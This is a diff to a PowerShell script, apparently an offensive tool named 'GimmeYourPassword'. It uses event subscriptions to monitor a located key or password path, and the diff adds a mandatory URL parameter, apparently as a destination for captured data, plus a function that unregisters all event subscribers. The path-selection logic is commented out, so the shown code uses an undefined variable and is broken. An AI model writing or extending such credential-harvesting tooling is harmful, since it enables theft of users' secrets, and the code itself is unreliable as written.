@@ -108,11 +108,27 @@ function start-tempsubscription{
   }
     }
 
+function Remove-GimmeYourPassword {
+	get-eventsubscriber | unregister-event -verbose
+}
+
 function Invoke-GimmeYourPassword {
-	$pathToMonitor=search-keys -Invoke
-    write-output $pathToMonitor[0]
-    write-output $pathToMonitor[1]
-    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1]
+	param (
+        [Parameter(Mandatory=$True)]
+		[string]$URL,
+		[string]$completePath
+    )
+	#Need to add a check here. If path is  provided, we should go straight to obtain path for filtering and then call start tempsubscription. 
+	Remove-GimmeyourPassword
+	#If ($completepath is populated) {
+		#$pathToMonitor=obtainPath -path $completePath
+	#}
+	#else {
+	#$pathToMonitor=search-keys -Invoke
+	#}
+    	write-output $pathToMonitor[0]
+    	write-output $pathToMonitor[1]
+    	start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1]
     #write-output $pathToMonitor[0]
     #write-output $pathToMonitor
     
